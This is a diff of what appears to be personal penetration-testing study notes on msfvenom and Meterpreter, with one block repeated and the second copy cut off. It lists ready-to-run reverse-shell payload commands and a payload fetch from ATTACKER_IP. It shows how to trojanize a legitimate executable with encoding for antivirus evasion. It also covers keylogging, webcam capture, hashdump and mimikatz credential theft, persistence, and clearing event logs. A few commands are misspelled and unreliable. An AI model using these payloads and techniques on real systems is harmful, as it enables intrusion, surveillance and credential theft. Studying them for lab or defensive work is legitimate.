@@ -1647,17 +1647,549 @@ The `BUILTIN\\Users` group has **AD** and **WD** privileges, allowing the user t
 
 
 
-#### Exe-service
-exe-service payload and serve it through a python webserver:
+- Generate payloads
+- Access all payloads available in the Metasploit framework.
+- Create payloads in many different formats (PHP, exe, dll, elf, , aspx, .war, .py, etc.)
+- Different target systems (Apple, Windows, Android, Linux, etc.).
+- Used extensively in **lower-level exploit** development to generate **hexadecimal shellcode** when developing something like a **Buffer Overflow exploit**
+
+| Option                                               | Description                                         |
+| ---------------------------------------------------- | --------------------------------------------------- |
+| `msfvenom -l payloads`                               | Show payloads                                       |
+| `msfvenom --list payloads`                           | list supported output formats                       |
+| `msfvenom -p payload`                                | Select a payload                                    |
+| `msfvenom -p cmd/unix/reverse_netcat --list-options` | List options                                        |
+| `R`                                                  | Set `R` at final of code is to specify reverseshell |
+
+```shell
+payload options
+```
+```sh
+msfvenom --list payloads
+```
+```sh
+msfvenom -s linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=443
+```
+# Non staged - Single
+- send payload in 1 file
+- easier to use and catch
+- easier for an antivirus or intrusion detection program to discover and remove.
+- Stageless payloads are denoted with underscores (`_`)
+# Stages
+- send payload in some files or parts
+- harder to use,
+- **first part** is called the _stager_
+- executed directly on the server itself.
+- It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself.
+- preventing it from touching the disk where it could be caught by traditional anti-virus solutions.
+- connects to the listener and uses the connection **to load the real payload**
+- Thus the payload is **split** into **two parts**
+	- a small **initial stager**
+	- then the bulkier **reverse shell code** which is downloaded when the stager is activated
+- Staged payloads require a special listener, usually the Metasploit Multihandler
+- Modern day antivirus solutions will also make use of the [[AMSI\|AMSI]] to detect the payload
+- are denoted with another forward slash (`/`).
+# **Output formats**
+```
+msfvenom --list formats
+```
+
+# Payloads
+## Payload Naming Conventions
+```sh
+<OS>/<arch>/<payload>
+```
+
+Stageless reverse shell for an x86 Linux target
+```sh
+linux/x86/shell_reverse_tcp
+```
+
+Windows 32bit targets
+- exception, the arch is not specified
+```sh
+windows/shell_reverse_tcp
+```
+## Reverse payloads
+- you will need to **have the** exploit/multi/**handler module listening** on your attacking machine to work as a handler
+- You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters.
+- These values will be the same you have used when creating the msfvenom payload.
+
+| Option                                                                                          | Description |
+| ----------------------------------------------------------------------------------------------- | ----------- |
+| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe` | Windows     |
+| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp` | ASP         |
+| `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`          | Python      |
+| `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`     | PHP         |
+| `msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R`                                | Unix        |
+Linux - Executable and Linkable Format (elf)
+- staged
+```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
+```
+- The .elf format is comparable to the .exe format in Windows
+```bash
+chmod +x shell.elf
+./shell.elf
+```
+
+### Windows
+Exe-service
+- Exe-service payload and serve it through a python webserver:
 ```shell
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4747 -f exe-service -o rev-svc.exe
 
 python3 -m http.server
 ```
-pull the payload from Powershell
+- Pull the payload from Powershell
 ```powershell
 wget http://ATTACKER_IP:4848/rev-svc.exe -O rev-svc.exe
 ```
+
+Windows reverse tcp (staged)
+``` shell
+mfsvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=IP LPORT=47 -f exe -o reverse.exe
+```
+
+Windows reverse tcp (non staged)
+``` shell
+mfsvenom -p windows/x64/meterpreter_reverse_tcp --platform windows -a x64 LHOST=IP LPORT=47 -f exe -o reverse.exe
+```
+Windows x64 reverse shell, exe format
+```sh
+msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
+```
+### PHP
+- The output **PHP file** will miss the starting PHP tag commented and the end tag (`?>`), as seen below.
+![Pasted image 20240606180600.png|600](/img/user/Pasted%20image%2020240606180600.png)
+- The reverse_shell.php file should be edited to convert it into a working PHP file.
+- Below: Comments removed from the beginning of the file.
+- End tag added
+![Pasted image 20240606180735.png|500](/img/user/Pasted%20image%2020240606180735.png)
+![Pasted image 20240606180753.png|400](/img/user/Pasted%20image%2020240606180753.png)
+
+## 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+- Metasploit attack payload
+- Metasploit's own brand of fully-featured shell.
+- completely stable, making them a **very good thing when working with Windows targets**
+- Inbuilt functionality, such as file **uploads** and **downloads**.
+- that provides an **interactive shell** from which an attacker can explore the target machine and **execute code.**
+- runs on the target system but **is not installed** on it. It **runs in memory**
+- It is typically deployed using in-memory DLL injection to reside entirely in **memory**.
+- aims to **avoid** being **detected** during **antivirus** scans.
+- aims to avoid being detected by network-based [[Networking/Seguridad en redes/Seguridad Perimetral/IPS\|IPS]] and [[Networking/Seguridad en redes/Seguridad Perimetral/IDS\|IDS]]
+- The **downside** to meterpreter shells is that they _must_ be caught in Metasploit.
+- using **encrypted** communication
+- **If** the target organization **does not decrypt and inspect** encrypted **traffic** (e.g. HTTPS) coming to and going out of the local network, IPS and IDS solutions **will not be able to detect** its activities.
+- establish an encrypted ([[TLS\|TLS]]) communication channel
+- most **antivirus** software **will** **detect it.**
+- Run in windows under the `spoolsv.exe` process
+
+| Option                                         | Description                                             |
+| ---------------------------------------------- | ------------------------------------------------------- |
+| `help`                                         | SHow help                                               |
+| `getpid`                                       | Show the [[PID\|PID]]                                        |
+| `ps`                                           | list processes running on the system                    |
+| `tasklist /m /fi "pid eq 1304"`                | look at DLLs (Dynamic-Link Libraries) used by a process |
+| `msfvenom --list payloads \| grep meterpreter` | List type of meterpreter payloads                       |
+- some exploits will have a default Meterpreter payload
+
+# Migrate shell to meterpreter
+By default upgrade to x32 (x86)
+```shell
+post/multi/manage/shell_to_meterpreter
+```
+It possible to modify the ruby code to change to x64
+![Pasted image 20241003114902.png](/img/user/attachments/Pasted%20image%2020241003114902.png)
+```shell
+reload_all
+```
+# How to decide which payload to use
+- The target operating system (Is the target operating system Linux or Windows?
+- Components available on the target system (Is Python installed? Is this a PHP website? etc.)
+- Network connection types you can have with the target system (Do they allow raw TCP connections? Can you only have an HTTPS reverse connection? Are IPv6 addresses not as closely monitored as IPv4 addresses? etc.)
+# Commands
+## Core commands
+
+| Option       | Description                                            |
+| ------------ | ------------------------------------------------------ |
+| `background` | Backgrounds the current session                        |
+| `exit`       | Terminate the Meterpreter session                      |
+| `guid`       | Get the session GUID (Globally Unique Identifier)      |
+| `help`       | Displays the help menu                                 |
+| `info`       | Displays information about a Post module               |
+| `irb`        | Opens an interactive Ruby shell on the current session |
+| `load`       | Loads one or more Meterpreter extensions               |
+| `migrate`    | Allows you to migrate Meterpreter to another process   |
+| `run`        | Executes a Meterpreter script or Post module           |
+| `sessions`   | Quickly switch to another session                      |
+## File system commands
+
+| Option                   | Description                                                   |
+| ------------------------ | ------------------------------------------------------------- |
+| `cd`                     | Will change directory                                         |
+| `ls`                     | Will list files in the current directory (dir will also work) |
+| `pwd`                    | Prints the current working directory                          |
+| `edit`                   | will allow you to edit a file                                 |
+| `cat`                    | Will show the contents of a file to the screen                |
+| `rm`                     | Will delete the specified file                                |
+| `rmdir`                  | Will delete a folder.                                         |
+| `search`                 | Will search for files                                         |
+| `upload local_path_file` | Will upload a file or directory                               |
+| `download`               | Will download a file or directory                             |
+## Networking commands
+
+| Option                                     | Description                                                |
+| ------------------------------------------ | ---------------------------------------------------------- |
+| `arp`                                      | Displays the host ARP (Address Resolution Protocol) cache  |
+| `ifconfig`                                 | Displays network interfaces available on the target system |
+| `netstat`                                  | Displays the network connections                           |
+| `route`                                    | Allows you to view and modify the routing table            |
+| `portfwd`                                  | Forwards a local port to a remote service                  |
+| `portfwd add -l 8080 -p 80 -r 10.0.2.3`    | lport 8080, rport 80, rhost 10.0.2.3                       |
+| `portfwd delete -l 8080 -p 80 -r 10.0.2.3` | Delete                                                     |
+| `portfwd list`                             | List porforwarding configs                                 |
+## System commands
+
+| Option       | Description                                          |
+| ------------ | ---------------------------------------------------- |
+| `sysinfo`    | Gets information about the remote system, such as OS |
+| `getuid`     | Shows the user that Meterpreter is running as        |
+| `clearev`    | Clears the event logs                                |
+| `execute`    | Executes a command                                   |
+| `getpid`     | Shows the current process identifier                 |
+| `kill`       | Terminates a process                                 |
+| `pkill`      | Terminates processes by name                         |
+| `ps`         | Lists running processes                              |
+| `reboot`     | Reboots the remote computer                          |
+| `shell`      | Drops into a system command shell                    |
+| `shutdown`   | Shuts down the remote computer                       |
+| `show_mount` | Show mount drivers                                   |
+## Keylogger
+| Option          | Description                 |
+| --------------- | --------------------------- |
+| `keyscan_start` | Starts capturing keystrokes |
+| `keyscan_stop`  | tops capturing keystrokes   |
+| `keyscan_dump`  | Dumps the keystroke buffer  |
+## Sniffer
+
+| Option               | Description     |
+| -------------------- | --------------- |
+| `use sniffer`        | Use             |
+| `sniffer_interfaces` | Show interfaces |
+| `snifer_start`       |                 |
+| `snifer_stats`       | Show stats      |
+| `snifer_stop`        |                 |
+| `snifer_dumps`       |                 |
+## Webcam
+
+| Option          | Description                                    |
+| --------------- | ---------------------------------------------- |
+| `webcam_chat`   | Starts a video chat                            |
+| `webcam_list`   | Lists webcams                                  |
+| `webcam_snap`   | Takes a snapshot from the specified webcam     |
+| `webcam_stream` | Plays a video stream from the specified webcam |
+## Activity
+Get a kit of features, screenshots, webcam, keylogger.
+
+| Option           | Description        |
+| ---------------- | ------------------ |
+| `load beholder`  | Load               |
+| `beholder_start` | Start the beholder |
+## Other commands
+These will be listed under different menu categories in the help menu
+
+| Option        | Description                                                 |
+| ------------- | ----------------------------------------------------------- |
+| `idletime`    | Returns the number of seconds the remote user has been idle |
+| `screenshare` | Allows you to watch the remote user's desktop in real time  |
+| `screenshot`  | Grabs a screenshot of the interactive desktop               |
+| `record_mic`  | Records audio from the default microphone for X seconds     |
+| `getsystem`   | Attempts to elevate your privilege to that of local system  |
+| `hashdump`    | Dumps the contents of the SAM database                      |
+| `getprivs`    | Show privileges                                             |
+| `timestomp`   | Modify timestamps of files on the system.                   |
+| `run vnc`     | Run an [[vnc\|vnc]] in a machine.                                |
+# Versions available
+- Android
+- Apple iOS
+- Java
+- Linux
+
+| Option                              | Description           |
+| ----------------------------------- | --------------------- |
+| `linux/x86/meterpreter_reverse_tcp` | Linux 32bit stageless |
+- OSX
+- PHP
+- Python
+- Windows
+
+| Option                                | Description                              |
+| ------------------------------------- | ---------------------------------------- |
+| `windows/x64/meterpreter/reverse_tcp` | Windows 64bit staged Meterpreter payload |
+# Post explotation
+- `getuid` This will give you an idea of your possible privilege level on the target system - NT AUTHORITY\SYSTEM or a regular user?
+- The `ps` command will list running processes. The PID column will also give you the PID information you will need to **migrate Meterpreter to another process.**
+
+## Post explotation Phases
+- Gathering further information about the target system.
+- Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on the target system.
+- Privilege escalation.
+- Lateral movement.
+
+## Migrate
+- if you see a word processor running on the target (e.g. word.exe, notepad.exe, etc.),
+- you can migrate to it and start **capturing keystrokes** sent by the user to this process
+- Some Meterpreter versions will offer the `keyscan_start`, or others commands options to make Meterpreter act like a **keylogger**.
+- may also help you to have a **more stable** Meterpreter **session**.
+- **Alert** you **may lose** your user **privileges** **if you migrate from a higher privileged** (e.g. SYSTEM) user to a process started by a lower privileged user (e.g. webserver). You **may not be able to gain them back.**
+- By default meterpreter 
+  `powershell.exe x86 User-PC\User C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe`
+- look for a process
+  ` 2244  488   taskeng.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\taskeng.exe`
+
+| Option                    | Description          |
+| ------------------------- | -------------------- |
+| `migrate -N PROCESS_NAME` | Using the name       |
+| `migrate PID_NUMBER`      | Using the PID number |
+## Hashdump
+- will **list** the content of the **[[SAM\|SAM]] database**
+- These hashes can also be used in [[Pass-the-Hash\|Pass-the-Hash]] attacks
+## Search
+- useful to locate **files with** potentially **juicy information**
+- In a CTF context, this can be used to quickly **find a flag or proof file,**
+- In penetration testing engagements, may need to search for **user-generated files** or c**onfiguration files** that may contain **password or account information.**
+```shell-session
+search -f flag2.txt
+```
+## Shell
+- Launch a regular command-line shell on the target system
+- CTRL+Z will help you go back to the Meterpreter shell.
+```sh
+shell
+```
+## powershell
+Get a powershell on meterpreter
+```shell
+load powershell
+powershell_shell
+```
+
+## Persistence
+Background
+```shell
+use exploit/windows/local/persistence_service
+use exploit/windows/local/persistence
+```
+- Use 
+`windows/x64/shell/reverse_https`
+
+Forground
+```shell
+run exploit/windows/local/persistence args1[val1] args2[val2]
+```
+## Crack hash
+```shell
+use auxiliary/analize/jtr_crack_fast
+```
+
+## Enumerating gathering
+### Windows
+To run all below
+```shell
+run winenum
+```
+
+Aplications in the computer
+```shell
+use  post/windows/gather/enum_applications
+set session 47
+```
+Devices, peripheral
+```shell
+use post/windows/gather/enum_devices
+set session 47
+```
+Files
+```shell
+use post/windows/gather/enumfiles
+```
+Internet explorer
+```shell
+use post/windows/gather/enum_ie
+```
+Users
+```shell
+use post/windows/gather/enum_logged_on_users
+```
+Licenses
+```shell
+use post/windows/gather/enum_ms_product_keys
+```
+Browsers history (malicious pages xx)
+```shell
+use post/windows/gather/browser_history
+```
+Drivers (write permissions)
+```shell
+use post/windows/gather/forensics/enum_drivers
+```
+Environment variables
+```shell
+use post/multi/gather/env
+```
+Hashdump
+```shell
+use post/windows/gather/hashdump
+```
+Hashdump after trying  escalate
+```shell
+use post/windows/gather/smart_hashdump
+```
+### Linux
+```shell
+use post/linux/gather/enum_configs
+use post/linux/gather/enum_network
+use post/linux/gather/enum_users_history
+use post/linux/gather/enum_protections
+use post/linux/busybox/enum_connections
+use post/linux/gather/hashdump
+```
+# Extensions
+To show list of extensions
+```sh
+use -l
+```
+## stdapi
+- Default
+## Single sign on credential collector
+```shell
+use post/windows/gather/credential/sso
+```
+### kiwi mimikatz
+ 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+- To windows
+- On recent versions are parched
+- Password dumping tool
+
+| Option                                            | Description                                                 |
+| ------------------------------------------------- | ----------------------------------------------------------- |
+| `load kiwi`                                       | Load                                                        |
+| `creds_all`                                       | Retrieve all credentials (parsed)                           |
+| `lsa_dump_secrets`                                | Dump LSA secrets (unparsed)                                 |
+| `lsa_dump_sam`                                    | Dump LSA SAM (unparsed)                                     |
+| `golden_ticket_create`                            | Create a golden kerberos ticket to [[Golden ticket attack\|Golden ticket attack]] |
+| `password_change -u user -n hashNTLM -P password` | Change the password/hash of a user                          |
+When use `creds_all` allows us to steal this password out of memory even without the user 'Dark' logged in **if a scheduled task** runs the Icecast as the user 'Dark'.
+
+</div></div>
+
+# Some modules
+## To scan vuln on windows
+```shell
+run multi/recon/local_exploit_suggester
+```
+## Enable [[RDP\|RDP]]
+```shell
+run post/windows/manage/enable_rdp
+```
+
+
+</div></div>
+
+
+# Encoders
+- Encoders **do not aim to bypass antivirus** installed on the target system
+- **Encode** the payload.
+- Can be effective against **some antivirus** software
+- Use with `-e`
+
+| Option         | Description                                                 |
+| -------------- | ----------------------------------------------------------- |
+| `-f <format>`  | Specifies the output format.                                |
+| `-o <file>`    | The output location and filename for the generated payload. |
+| `LHOST=<IP>`   | Specifies the IP to connect back to.                        |
+| `LPORT=<port>` | The port on the local machine to connect back to.           |
+| `--platform`   | specificity paltorm                                         |
+| `-a`           | specificity arch                                            |
+| `-i 10`        | Interate, times to encode                                   |
+| `-e`           | Especify the encoder method                                 |
+The PHP version of Meterpreter was **encoded in Base64**, and the output format was `raw`.
+Staged
+``` shell
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 LPORT=47 -f raw -e php/base64
+```
+
+ To get access with [[Notes/Netcat\|Netcat]] 
+``` shell
+msfvenom -p php/shell/reverse_tcp LHOST=10.10.186.44 LPORT=47 -f raw -e php/base64
+```
+# FIle templates
+- Set payload into a existent file
+- Doesn't work on all programs
+
+| Option   | Description                                |
+| -------- | ------------------------------------------ |
+| `-x`     | Set the original program                   |
+| `--keep` | Try to keep the original app functionality |
+Windows
+```shell
+msfvemon -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=4747 -e x86/shikata_ga_nai -i 25 -x original_app.exe --keep -f exe -o new_app.exe
+```
+
+# 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+- Like socat and netcat
+- used to **receive reverse shells.**
+- fully-fledged way to obtain stable shells
+- with a wide variety of further options to improve the caught shell.
+- only way to interact with a _meterpreter_ shell
+- the easiest way to handle _staged_ payloads
+- Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.
+``` shell
+use exploit/multi/handler
+```
+set the payload value (`php/reverse_php` in this case), the LHOST, and LPORT values.
+`php/meterpreter/reverse_tcp`
+```bash
+set payload php/reverse_php
+setg LHOST 192.x.x.x
+setg LPORT 47
+```
+
+Example to DVWA (Damn Vulnerable Web Application)
+``` sh
+set payload php/reverse_php
+set lhost 10.0.2.19
+set lport 7777
+run
+```
+
+send seasson to background
+```
+background
+```
+
+Start a listener in the background
+```sh
+exploit -j
+```
+Then we needed to use `sessions 1` to foreground it again.
+
+
+</div></div>
+
 
 </div></div>
 
@@ -1716,17 +2248,549 @@ Generate an exe-service payload using [[Metasploit/Msfvenom\|msfvenom]]
 
 
 
-#### Exe-service
-exe-service payload and serve it through a python webserver:
+- Generate payloads
+- Access all payloads available in the Metasploit framework.
+- Create payloads in many different formats (PHP, exe, dll, elf, , aspx, .war, .py, etc.)
+- Different target systems (Apple, Windows, Android, Linux, etc.).
+- Used extensively in **lower-level exploit** development to generate **hexadecimal shellcode** when developing something like a **Buffer Overflow exploit**
+
+| Option                                               | Description                                         |
+| ---------------------------------------------------- | --------------------------------------------------- |
+| `msfvenom -l payloads`                               | Show payloads                                       |
+| `msfvenom --list payloads`                           | list supported output formats                       |
+| `msfvenom -p payload`                                | Select a payload                                    |
+| `msfvenom -p cmd/unix/reverse_netcat --list-options` | List options                                        |
+| `R`                                                  | Set `R` at final of code is to specify reverseshell |
+
+```shell
+payload options
+```
+```sh
+msfvenom --list payloads
+```
+```sh
+msfvenom -s linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=443
+```
+# Non staged - Single
+- send payload in 1 file
+- easier to use and catch
+- easier for an antivirus or intrusion detection program to discover and remove.
+- Stageless payloads are denoted with underscores (`_`)
+# Stages
+- send payload in some files or parts
+- harder to use,
+- **first part** is called the _stager_
+- executed directly on the server itself.
+- It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself.
+- preventing it from touching the disk where it could be caught by traditional anti-virus solutions.
+- connects to the listener and uses the connection **to load the real payload**
+- Thus the payload is **split** into **two parts**
+	- a small **initial stager**
+	- then the bulkier **reverse shell code** which is downloaded when the stager is activated
+- Staged payloads require a special listener, usually the Metasploit Multihandler
+- Modern day antivirus solutions will also make use of the [[AMSI\|AMSI]] to detect the payload
+- are denoted with another forward slash (`/`).
+# **Output formats**
+```
+msfvenom --list formats
+```
+
+# Payloads
+## Payload Naming Conventions
+```sh
+<OS>/<arch>/<payload>
+```
+
+Stageless reverse shell for an x86 Linux target
+```sh
+linux/x86/shell_reverse_tcp
+```
+
+Windows 32bit targets
+- exception, the arch is not specified
+```sh
+windows/shell_reverse_tcp
+```
+## Reverse payloads
+- you will need to **have the** exploit/multi/**handler module listening** on your attacking machine to work as a handler
+- You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters.
+- These values will be the same you have used when creating the msfvenom payload.
+
+| Option                                                                                          | Description |
+| ----------------------------------------------------------------------------------------------- | ----------- |
+| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe` | Windows     |
+| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp` | ASP         |
+| `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`          | Python      |
+| `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`     | PHP         |
+| `msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R`                                | Unix        |
+Linux - Executable and Linkable Format (elf)
+- staged
+```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
+```
+- The .elf format is comparable to the .exe format in Windows
+```bash
+chmod +x shell.elf
+./shell.elf
+```
+
+### Windows
+Exe-service
+- Exe-service payload and serve it through a python webserver:
 ```shell
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4747 -f exe-service -o rev-svc.exe
 
 python3 -m http.server
 ```
-pull the payload from Powershell
+- Pull the payload from Powershell
 ```powershell
 wget http://ATTACKER_IP:4848/rev-svc.exe -O rev-svc.exe
 ```
+
+Windows reverse tcp (staged)
+``` shell
+mfsvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=IP LPORT=47 -f exe -o reverse.exe
+```
+
+Windows reverse tcp (non staged)
+``` shell
+mfsvenom -p windows/x64/meterpreter_reverse_tcp --platform windows -a x64 LHOST=IP LPORT=47 -f exe -o reverse.exe
+```
+Windows x64 reverse shell, exe format
+```sh
+msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
+```
+### PHP
+- The output **PHP file** will miss the starting PHP tag commented and the end tag (`?>`), as seen below.
+![Pasted image 20240606180600.png|600](/img/user/Pasted%20image%2020240606180600.png)
+- The reverse_shell.php file should be edited to convert it into a working PHP file.
+- Below: Comments removed from the beginning of the file.
+- End tag added
+![Pasted image 20240606180735.png|500](/img/user/Pasted%20image%2020240606180735.png)
+![Pasted image 20240606180753.png|400](/img/user/Pasted%20image%2020240606180753.png)
+
+## 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+- Metasploit attack payload
+- Metasploit's own brand of fully-featured shell.
+- completely stable, making them a **very good thing when working with Windows targets**
+- Inbuilt functionality, such as file **uploads** and **downloads**.
+- that provides an **interactive shell** from which an attacker can explore the target machine and **execute code.**
+- runs on the target system but **is not installed** on it. It **runs in memory**
+- It is typically deployed using in-memory DLL injection to reside entirely in **memory**.
+- aims to **avoid** being **detected** during **antivirus** scans.
+- aims to avoid being detected by network-based [[Networking/Seguridad en redes/Seguridad Perimetral/IPS\|IPS]] and [[Networking/Seguridad en redes/Seguridad Perimetral/IDS\|IDS]]
+- The **downside** to meterpreter shells is that they _must_ be caught in Metasploit.
+- using **encrypted** communication
+- **If** the target organization **does not decrypt and inspect** encrypted **traffic** (e.g. HTTPS) coming to and going out of the local network, IPS and IDS solutions **will not be able to detect** its activities.
+- establish an encrypted ([[TLS\|TLS]]) communication channel
+- most **antivirus** software **will** **detect it.**
+- Run in windows under the `spoolsv.exe` process
+
+| Option                                         | Description                                             |
+| ---------------------------------------------- | ------------------------------------------------------- |
+| `help`                                         | SHow help                                               |
+| `getpid`                                       | Show the [[PID\|PID]]                                        |
+| `ps`                                           | list processes running on the system                    |
+| `tasklist /m /fi "pid eq 1304"`                | look at DLLs (Dynamic-Link Libraries) used by a process |
+| `msfvenom --list payloads \| grep meterpreter` | List type of meterpreter payloads                       |
+- some exploits will have a default Meterpreter payload
+
+# Migrate shell to meterpreter
+By default upgrade to x32 (x86)
+```shell
+post/multi/manage/shell_to_meterpreter
+```
+It possible to modify the ruby code to change to x64
+![Pasted image 20241003114902.png](/img/user/attachments/Pasted%20image%2020241003114902.png)
+```shell
+reload_all
+```
+# How to decide which payload to use
+- The target operating system (Is the target operating system Linux or Windows?
+- Components available on the target system (Is Python installed? Is this a PHP website? etc.)
+- Network connection types you can have with the target system (Do they allow raw TCP connections? Can you only have an HTTPS reverse connection? Are IPv6 addresses not as closely monitored as IPv4 addresses? etc.)
+# Commands
+## Core commands
+
+| Option       | Description                                            |
+| ------------ | ------------------------------------------------------ |
+| `background` | Backgrounds the current session                        |
+| `exit`       | Terminate the Meterpreter session                      |
+| `guid`       | Get the session GUID (Globally Unique Identifier)      |
+| `help`       | Displays the help menu                                 |
+| `info`       | Displays information about a Post module               |
+| `irb`        | Opens an interactive Ruby shell on the current session |
+| `load`       | Loads one or more Meterpreter extensions               |
+| `migrate`    | Allows you to migrate Meterpreter to another process   |
+| `run`        | Executes a Meterpreter script or Post module           |
+| `sessions`   | Quickly switch to another session                      |
+## File system commands
+
+| Option                   | Description                                                   |
+| ------------------------ | ------------------------------------------------------------- |
+| `cd`                     | Will change directory                                         |
+| `ls`                     | Will list files in the current directory (dir will also work) |
+| `pwd`                    | Prints the current working directory                          |
+| `edit`                   | will allow you to edit a file                                 |
+| `cat`                    | Will show the contents of a file to the screen                |
+| `rm`                     | Will delete the specified file                                |
+| `rmdir`                  | Will delete a folder.                                         |
+| `search`                 | Will search for files                                         |
+| `upload local_path_file` | Will upload a file or directory                               |
+| `download`               | Will download a file or directory                             |
+## Networking commands
+
+| Option                                     | Description                                                |
+| ------------------------------------------ | ---------------------------------------------------------- |
+| `arp`                                      | Displays the host ARP (Address Resolution Protocol) cache  |
+| `ifconfig`                                 | Displays network interfaces available on the target system |
+| `netstat`                                  | Displays the network connections                           |
+| `route`                                    | Allows you to view and modify the routing table            |
+| `portfwd`                                  | Forwards a local port to a remote service                  |
+| `portfwd add -l 8080 -p 80 -r 10.0.2.3`    | lport 8080, rport 80, rhost 10.0.2.3                       |
+| `portfwd delete -l 8080 -p 80 -r 10.0.2.3` | Delete                                                     |
+| `portfwd list`                             | List porforwarding configs                                 |
+## System commands
+
+| Option       | Description                                          |
+| ------------ | ---------------------------------------------------- |
+| `sysinfo`    | Gets information about the remote system, such as OS |
+| `getuid`     | Shows the user that Meterpreter is running as        |
+| `clearev`    | Clears the event logs                                |
+| `execute`    | Executes a command                                   |
+| `getpid`     | Shows the current process identifier                 |
+| `kill`       | Terminates a process                                 |
+| `pkill`      | Terminates processes by name                         |
+| `ps`         | Lists running processes                              |
+| `reboot`     | Reboots the remote computer                          |
+| `shell`      | Drops into a system command shell                    |
+| `shutdown`   | Shuts down the remote computer                       |
+| `show_mount` | Show mount drivers                                   |
+## Keylogger
+| Option          | Description                 |
+| --------------- | --------------------------- |
+| `keyscan_start` | Starts capturing keystrokes |
+| `keyscan_stop`  | tops capturing keystrokes   |
+| `keyscan_dump`  | Dumps the keystroke buffer  |
+## Sniffer
+
+| Option               | Description     |
+| -------------------- | --------------- |
+| `use sniffer`        | Use             |
+| `sniffer_interfaces` | Show interfaces |
+| `snifer_start`       |                 |
+| `snifer_stats`       | Show stats      |
+| `snifer_stop`        |                 |
+| `snifer_dumps`       |                 |
+## Webcam
+
+| Option          | Description                                    |
+| --------------- | ---------------------------------------------- |
+| `webcam_chat`   | Starts a video chat                            |
+| `webcam_list`   | Lists webcams                                  |
+| `webcam_snap`   | Takes a snapshot from the specified webcam     |
+| `webcam_stream` | Plays a video stream from the specified webcam |
+## Activity
+Get a kit of features, screenshots, webcam, keylogger.
+
+| Option           | Description        |
+| ---------------- | ------------------ |
+| `load beholder`  | Load               |
+| `beholder_start` | Start the beholder |
+## Other commands
+These will be listed under different menu categories in the help menu
+
+| Option        | Description                                                 |
+| ------------- | ----------------------------------------------------------- |
+| `idletime`    | Returns the number of seconds the remote user has been idle |
+| `screenshare` | Allows you to watch the remote user's desktop in real time  |
+| `screenshot`  | Grabs a screenshot of the interactive desktop               |
+| `record_mic`  | Records audio from the default microphone for X seconds     |
+| `getsystem`   | Attempts to elevate your privilege to that of local system  |
+| `hashdump`    | Dumps the contents of the SAM database                      |
+| `getprivs`    | Show privileges                                             |
+| `timestomp`   | Modify timestamps of files on the system.                   |
+| `run vnc`     | Run an [[vnc\|vnc]] in a machine.                                |
+# Versions available
+- Android
+- Apple iOS
+- Java
+- Linux
+
+| Option                              | Description           |
+| ----------------------------------- | --------------------- |
+| `linux/x86/meterpreter_reverse_tcp` | Linux 32bit stageless |
+- OSX
+- PHP
+- Python
+- Windows
+
+| Option                                | Description                              |
+| ------------------------------------- | ---------------------------------------- |
+| `windows/x64/meterpreter/reverse_tcp` | Windows 64bit staged Meterpreter payload |
+# Post explotation
+- `getuid` This will give you an idea of your possible privilege level on the target system - NT AUTHORITY\SYSTEM or a regular user?
+- The `ps` command will list running processes. The PID column will also give you the PID information you will need to **migrate Meterpreter to another process.**
+
+## Post explotation Phases
+- Gathering further information about the target system.
+- Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on the target system.
+- Privilege escalation.
+- Lateral movement.
+
+## Migrate
+- if you see a word processor running on the target (e.g. word.exe, notepad.exe, etc.),
+- you can migrate to it and start **capturing keystrokes** sent by the user to this process
+- Some Meterpreter versions will offer the `keyscan_start`, or others commands options to make Meterpreter act like a **keylogger**.
+- may also help you to have a **more stable** Meterpreter **session**.
+- **Alert** you **may lose** your user **privileges** **if you migrate from a higher privileged** (e.g. SYSTEM) user to a process started by a lower privileged user (e.g. webserver). You **may not be able to gain them back.**
+- By default meterpreter 
+  `powershell.exe x86 User-PC\User C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe`
+- look for a process
